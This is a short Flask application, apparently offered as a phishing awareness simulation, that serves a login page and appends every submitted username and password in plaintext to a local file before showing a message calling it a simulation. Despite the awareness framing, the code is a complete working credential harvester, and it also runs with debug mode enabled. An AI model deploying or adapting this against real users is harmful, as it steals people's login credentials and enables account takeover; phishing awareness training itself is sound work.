from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def capture():
    username = request.form['username']
    password = request.form['password']

    with open("captured_data.txt", "a") as f:
        f.write(f"Username: {username} | Password: {password}\n")

    return "<h2>This was a phishing awareness simulation. Never enter credentials on unknown sites.</h2>"

if __name__ == '__main__':
    app.run(debug=True)
